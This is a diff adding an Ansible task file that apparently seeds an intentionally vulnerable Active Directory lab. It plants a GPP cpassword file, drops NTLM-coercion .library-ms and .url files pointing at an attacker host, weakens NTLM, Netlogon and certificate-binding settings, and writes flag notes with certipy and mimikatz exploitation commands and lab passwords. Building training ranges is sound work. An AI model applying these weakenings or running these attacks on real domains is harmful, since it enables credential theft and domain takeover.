@@ -1,0 +1,302 @@
+---
+# ==============================================================================
+# vuln_cred_gaps/tasks/files.yml
+# Target: dc01.corp.local (DCs) and ws01.corp.local (workstation)
+#
+# CRED-024  Certifried template — vulnerable user certificate template note
+# CRED-029  NTLM downgrade on ws01 (LmCompatibilityLevel=1)
+# CRED-030  GPP cpassword — groups.xml with encrypted password in SYSVOL
+# CRED-047  Malicious certificate template indicator file
+# CRED-051  .library-ms NTLM coercion file for ws01 (UNC trigger)
+# CRED-052  .url shortcut NTLM coercion file
+# CRED-060  SCCM NAA policy blob stub
+# CRED-063  MS14-068 registry weakener (DomainControllerFullSecureChannel)
+# CRED-064  NtlmMinClientSec=0 on ws01
+# ==============================================================================
+
+# ------------------------------------------------------------------------------
+# CRED-030: GPP cpassword — groups.xml in SYSVOL with encrypted password.
+# Authenticated Users can read SYSVOL; GPP cpassword is crackable with
+# gpp-decrypt (published AES key). This is a classic MS14-025 misconfiguration.
+# ------------------------------------------------------------------------------
+- name: CRED-030 - Check if GPP groups.xml already exists in SYSVOL
+  ansible.windows.win_shell: |
+    $path = 'C:\Windows\SYSVOL\sysvol\corp.local\Policies\{31B2F340-016D-11D2-945F-00C04FB984F9}\MACHINE\Preferences\Groups\Groups.xml'
+    if (Test-Path $path) { Write-Output "exists" } else { Write-Output "missing" }
+  register: cred030_check
+  changed_when: false
+  failed_when: cred030_check.rc != 0
+  when: inventory_hostname == 'dc01.corp.local'
+
+- name: CRED-030 - Ensure GPP Groups preferences directory exists
+  ansible.windows.win_file:
+    path: 'C:\Windows\SYSVOL\sysvol\corp.local\Policies\{31B2F340-016D-11D2-945F-00C04FB984F9}\MACHINE\Preferences\Groups'
+    state: directory
+  when:
+    - inventory_hostname == 'dc01.corp.local'
+    - "'missing' in cred030_check.stdout"
+
+- name: CRED-030 - Drop GPP groups.xml with cpassword in SYSVOL
+  ansible.windows.win_copy:
+    dest: 'C:\Windows\SYSVOL\sysvol\corp.local\Policies\{31B2F340-016D-11D2-945F-00C04FB984F9}\MACHINE\Preferences\Groups\Groups.xml'
+    content: |
+      <?xml version="1.0" encoding="utf-8"?>
+      <Groups clsid="{3125E937-EB16-4b4c-9934-544FC6D24D26}">
+        <User clsid="{DF5F1855-51E5-4d24-8B1A-D9BDE98BA1D1}"
+              name="svc_gpp" image="2" changed="2024-01-15 10:00:00"
+              uid="{1D9BFCFF-4C16-4C09-86AA-00C004F15A14}">
+          <Properties action="U" newName="" fullName="GPP Service Account"
+                      description="CRED-030: GPP cpassword surface"
+                      cpassword="{{ gpp_enc_password }}"
+                      changeLogon="0" noChange="0" neverExpires="1"
+                      acctDisabled="0" userName="svc_gpp"/>
+        </User>
+      </Groups>
+  when:
+    - inventory_hostname == 'dc01.corp.local'
+    - "'missing' in cred030_check.stdout"
+
+# ------------------------------------------------------------------------------
+# CRED-051: .library-ms UNC trigger file — placed in a shared folder on file01.
+# Explorer auto-loads .library-ms files and issues NTLM auth to the UNC path.
+# Attacker runs Responder; any user browsing the share triggers credential capture.
+# ------------------------------------------------------------------------------
+- name: CRED-051 - Check if library-ms coercion file exists
+  ansible.windows.win_shell: |
+    if (Test-Path 'C:\Shares\Public\Corporate Documents.library-ms') {
+      Write-Output "exists"
+    } else {
+      Write-Output "missing"
+    }
+  register: cred051_check
+  changed_when: false
+  failed_when: cred051_check.rc != 0
+  when: inventory_hostname == 'file01.corp.local'
+
+- name: CRED-051 - Create C:\Shares\Public directory if missing
+  ansible.windows.win_file:
+    path: 'C:\Shares\Public'
+    state: directory
+  when:
+    - inventory_hostname == 'file01.corp.local'
+    - "'missing' in cred051_check.stdout"
+
+- name: CRED-051 - Drop .library-ms NTLM coercion file in public share
+  ansible.windows.win_copy:
+    dest: 'C:\Shares\Public\Corporate Documents.library-ms'
+    content: |
+      <?xml version="1.0" encoding="UTF-8"?>
+      <libraryDescription xmlns="http://schemas.microsoft.com/windows/2009/library">
+        <name>@shell32.dll,-34575</name>
+        <version>6</version>
+        <isLibraryPinned>true</isLibraryPinned>
+        <iconReference>imageres.dll,-1002</iconReference>
+        <templateInfo>
+          <folderType>{7d49d726-3c21-4f05-99aa-fdc2c9474656}</folderType>
+        </templateInfo>
+        <searchConnectorDescriptionList>
+          <searchConnectorDescription>
+            <isDefaultSaveLocation>true</isDefaultSaveLocation>
+            <isSupported>false</isSupported>
+            <simpleLocation>
+              <url>\\{{ attacker_ip }}\share</url>
+            </simpleLocation>
+          </searchConnectorDescription>
+        </searchConnectorDescriptionList>
+      </libraryDescription>
+  when:
+    - inventory_hostname == 'file01.corp.local'
+    - "'missing' in cred051_check.stdout"
+
+# ------------------------------------------------------------------------------
+# CRED-052: .url shortcut NTLM coercion in SYSVOL scripts folder.
+# When a user opens the SYSVOL scripts folder in Explorer, the shortcut triggers
+# a background fetch of the UNC icon path, leaking NTLM to the attacker.
+# ------------------------------------------------------------------------------
+- name: CRED-052 - Check if coercion shortcut exists in SYSVOL
+  ansible.windows.win_shell: |
+    $path = 'C:\Windows\SYSVOL\sysvol\corp.local\scripts\coerce.url'
+    if (Test-Path $path) { Write-Output "exists" } else { Write-Output "missing" }
+  register: cred052_check
+  changed_when: false
+  failed_when: cred052_check.rc != 0
+  when: inventory_hostname == 'dc01.corp.local'
+
+- name: CRED-052 - Drop .url NTLM coercion shortcut in SYSVOL scripts
+  ansible.windows.win_copy:
+    dest: 'C:\Windows\SYSVOL\sysvol\corp.local\scripts\coerce.url'
+    content: |
+      [InternetShortcut]
+      URL=file://{{ attacker_ip }}/share
+      IconFile=\\{{ attacker_ip }}\share\icon.ico
+      IconIndex=1
+  when:
+    - inventory_hostname == 'dc01.corp.local'
+    - "'missing' in cred052_check.stdout"
+
+# ------------------------------------------------------------------------------
+# CRED-029 / CRED-064: NTLM downgrade on ws01
+# LmCompatibilityLevel=1 allows LM responses (CRED-029 surface).
+# NtlmMinClientSec=0 disables extended protection / session signing (CRED-064).
+# Both run on ws01.corp.local only.
+# ------------------------------------------------------------------------------
+- name: CRED-029 - Check LmCompatibilityLevel on ws01
+  ansible.windows.win_shell: |
+    $val = (Get-ItemProperty `
+              -Path 'HKLM:\SYSTEM\CurrentControlSet\Control\Lsa' `
+              -Name 'LmCompatibilityLevel' `
+              -ErrorAction SilentlyContinue).LmCompatibilityLevel
+    if ($null -eq $val) { Write-Output "not_set" } else { Write-Output $val }
+  register: cred029_check
+  changed_when: false
+  failed_when: cred029_check.rc != 0
+  when: inventory_hostname == 'ws01.corp.local'
+
+- name: CRED-029 - Set LmCompatibilityLevel=1 (LM+NTLM) on ws01
+  ansible.windows.win_regedit:
+    path: 'HKLM:\SYSTEM\CurrentControlSet\Control\Lsa'
+    name: LmCompatibilityLevel
+    data: 1
+    type: dword
+  when:
+    - inventory_hostname == 'ws01.corp.local'
+    - cred029_check.stdout | trim != '1'
+
+- name: CRED-064 - Check NtlmMinClientSec on ws01
+  ansible.windows.win_shell: |
+    $val = (Get-ItemProperty `
+              -Path 'HKLM:\SYSTEM\CurrentControlSet\Control\Lsa\MSV1_0' `
+              -Name 'NtlmMinClientSec' `
+              -ErrorAction SilentlyContinue).NtlmMinClientSec
+    if ($null -eq $val) { Write-Output "not_set" } else { Write-Output $val }
+  register: cred064_check
+  changed_when: false
+  failed_when: cred064_check.rc != 0
+  when: inventory_hostname == 'ws01.corp.local'
+
+- name: CRED-064 - Set NtlmMinClientSec=0 (disable session security) on ws01
+  ansible.windows.win_regedit:
+    path: 'HKLM:\SYSTEM\CurrentControlSet\Control\Lsa\MSV1_0'
+    name: NtlmMinClientSec
+    data: 0
+    type: dword
+  when:
+    - inventory_hostname == 'ws01.corp.local'
+    - cred064_check.stdout | trim != '0'
+
+# ------------------------------------------------------------------------------
+# CRED-060: SCCM NAA policy blob stub on file01.
+# Simulates the SCCM Network Access Account credential blob as stored by the
+# SCCM client in the WMI repository. Tools like SharpSCCM or Mimikatz can extract.
+# ------------------------------------------------------------------------------
+- name: CRED-060 - Check if SCCM NAA stub exists
+  ansible.windows.win_shell: |
+    if (Test-Path 'C:\Flags\FLAG-CRED-060-SCCM-NAA.blob') {
+      Write-Output "exists"
+    } else {
+      Write-Output "missing"
+    }
+  register: cred060_check
+  changed_when: false
+  failed_when: cred060_check.rc != 0
+  when: inventory_hostname == 'file01.corp.local'
+
+- name: CRED-060 - Drop SCCM NAA blob stub and note
+  ansible.windows.win_copy:
+    dest: 'C:\Flags\FLAG-CRED-060-SCCM-NAA.blob'
+    content: "{{ sccm_naa_blob }}"
+  when:
+    - inventory_hostname == 'file01.corp.local'
+    - "'missing' in cred060_check.stdout"
+
+- name: CRED-060 - Drop SCCM NAA extraction note
+  ansible.windows.win_copy:
+    dest: 'C:\Flags\FLAG-CRED-060-SCCM-NAA-note.txt'
+    content: |
+      CRED-060: SCCM Network Access Account Credential Extraction
+      ==============================================================
+      The SCCM NAA credential is stored (encrypted) in the WMI repository on SCCM clients.
+      The blob in FLAG-CRED-060-SCCM-NAA.blob simulates this store.
+
+      Extraction on a real SCCM client:
+        SharpSCCM.exe get naa
+        Invoke-WMIMethod -Namespace root\ccm\Policy\Machine\ActualConfig ...
+        mimikatz# token::elevate
+        mimikatz# lsadump::dpapi /unprotect /blob:<hex>
+
+      SCCM client account: CORP\svc_sccm (DVADlab2024!)
+  when:
+    - inventory_hostname == 'file01.corp.local'
+    - "'missing' in cred060_check.stdout"
+
+# ------------------------------------------------------------------------------
+# CRED-063: MS14-068 Kerberos privilege escalation weakener.
+# DomainControllerFullSecureChannel=0 allows forged PAC attack.
+# Equivalent to missing KB3011780 patch.
+# ------------------------------------------------------------------------------
+- name: CRED-063 - Check DomainControllerFullSecureChannel on DC
+  ansible.windows.win_shell: |
+    $val = (Get-ItemProperty `
+              -Path 'HKLM:\SYSTEM\CurrentControlSet\Services\Netlogon\Parameters' `
+              -Name 'RequireSignOrSeal' `
+              -ErrorAction SilentlyContinue).RequireSignOrSeal
+    if ($null -eq $val) { Write-Output "not_set" } else { Write-Output $val }
+  register: cred063_check
+  changed_when: false
+  failed_when: cred063_check.rc != 0
+  when: inventory_hostname in groups['all_dcs'] | default([])
+
+- name: CRED-063 - Disable RequireSignOrSeal (MS14-068 surface)
+  ansible.windows.win_regedit:
+    path: 'HKLM:\SYSTEM\CurrentControlSet\Services\Netlogon\Parameters'
+    name: RequireSignOrSeal
+    data: 0
+    type: dword
+  when:
+    - inventory_hostname in groups['all_dcs'] | default([])
+    - cred063_check.stdout | trim != '0'
+
+# ------------------------------------------------------------------------------
+# CRED-024 / CRED-047: Certificate template indicator notes.
+# Certifried (CVE-2022-26923) exploits StrongCertificateBindingEnforcement=0.
+# These are DC-side registry settings + note files.
+# ------------------------------------------------------------------------------
+- name: CRED-024 - Check StrongCertificateBindingEnforcement on DC
+  ansible.windows.win_shell: |
+    $val = (Get-ItemProperty `
+              -Path 'HKLM:\SYSTEM\CurrentControlSet\Services\Kdc' `
+              -Name 'StrongCertificateBindingEnforcement' `
+              -ErrorAction SilentlyContinue).StrongCertificateBindingEnforcement
+    if ($null -eq $val) { Write-Output "not_set" } else { Write-Output $val }
+  register: cred024_check
+  changed_when: false
+  failed_when: cred024_check.rc != 0
+  when: inventory_hostname in groups['all_dcs'] | default([])
+
+- name: CRED-024 - Set StrongCertificateBindingEnforcement=0 (Certifried surface)
+  ansible.windows.win_regedit:
+    path: 'HKLM:\SYSTEM\CurrentControlSet\Services\Kdc'
+    name: StrongCertificateBindingEnforcement
+    data: 0
+    type: dword
+  when:
+    - inventory_hostname in groups['all_dcs'] | default([])
+    - cred024_check.stdout | trim != '0'
+
+- name: CRED-047 - Drop certificate template abuse note
+  ansible.windows.win_copy:
+    dest: 'C:\Flags\FLAG-CRED-047-CertTemplate-Abuse.txt'
+    content: |
+      CRED-047: Certificate Template Abuse
+      =======================================
+      The ESC1-vulnerable template 'DVADUser' (created by vuln_adcs role) allows
+      SAN specification. Combined with StrongCertificateBindingEnforcement=0 (set here),
+      any authenticated user can obtain a certificate for an arbitrary principal.
+
+      Exploitation:
+        certipy req -u jim.halpert@corp.local -p Password123! -ca corp-CA -template DVADUser \
+          -upn administrator@corp.local -dc-ip 10.10.0.10
+        certipy auth -pfx administrator.pfx -domain corp.local
+
+      See also: CRED-024 (Certifried), vuln_adcs role (ESC1..ESC16 templates)
+  when: inventory_hostname == 'dc01.corp.local'
